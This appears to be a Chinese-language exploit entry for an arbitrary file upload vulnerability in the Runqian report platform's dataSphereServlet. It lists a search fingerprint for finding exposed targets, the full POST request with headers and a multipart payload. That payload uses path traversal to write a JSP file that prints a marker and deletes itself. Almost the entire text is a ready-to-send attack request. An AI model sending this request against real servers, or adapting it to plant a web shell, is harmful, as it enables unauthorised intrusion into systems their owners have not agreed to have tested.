# 润乾报表平台dataSphereServlet任意文件上传漏洞

- **系统**：润乾报表平台dataSphereServlet　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/raqsoft"`
- **请求**：`POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----FGjhgjhvuyvuhyvulyvjhvktuv…`　`Cookie: JSESSIONID=D46F0E193FBD9BC2FCFB32D684296765`

**请求体 / payload**
```
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Content-Disposition: form-data; name="openGrpxFile"; filename="dudesuite.jsp"
Content-Type: text/plain
<% out.println("DudeSuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Content-Disposition: form-data; name="path"
../../../
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Content-Disposition: form-data; name="saveServer"
1
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft--
```
- **预期**：200　|　—